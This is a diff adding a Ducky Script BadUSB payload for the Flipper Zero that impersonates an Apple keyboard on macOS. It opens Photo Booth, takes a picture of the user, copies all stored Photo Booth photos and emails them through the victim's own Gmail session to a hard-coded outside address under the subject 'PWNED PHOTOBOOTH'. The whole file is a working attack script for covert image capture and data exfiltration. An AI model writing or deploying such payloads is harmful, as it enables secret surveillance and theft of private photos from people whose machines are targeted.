@@ -1,0 +1,65 @@
+REM Photobooth to Gmail 
+
+REM Ducky script formatted for Flipper Zero
+REM Created by Ecto-1 9/2022
+REM YOU NEED TO CHANGE THE RECIPENT EMAIL ON LINE 53 OR THE SCRIPT WILL FAIL
+
+ID 05AC:0263 Apple:Keyboard
+
+REM This section opens the MacOS photo booth app, captures a picture 
+REM then copies all photo booth photos to clipboard
+
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING photo booth
+DELAY 500
+ENTER
+DELAY 5000
+ENTER
+DELAY 6000
+GUI a
+DELAY 1000
+GUI c
+DELAY 500
+GUI q
+
+REM This section opens gmail in the web browser
+REM and clicks on compose to create a new email
+
+DELAY 500
+GUI SPACE
+DELAY 1000
+STRING HTTPS://GMAIL.COM
+DELAY 500
+ENTER
+DELAY 10000
+LEFTARROW
+DELAY 1000
+LEFTARROW
+DELAY 500
+LEFTARROW
+DELAY 1000
+UPARROW
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM this section fills out the recipient email address 
+REM tabs down to subject and pre-fills PWNED PHOTOBOOTH 
+REM tabs down to body of message and pastes the photos from clipboard
+REM it then sends the message and 
+
+STRING flipperdemos@gmail.com
+DELAY 1000
+ENTER
+TAB
+DELAY 500
+STRING PWNED PHOTOBOOTH 
+DELAY 500
+TAB
+GUI v 
+DELAY 5000
+GUI ENTER
+DELAY 5000
+GUI q
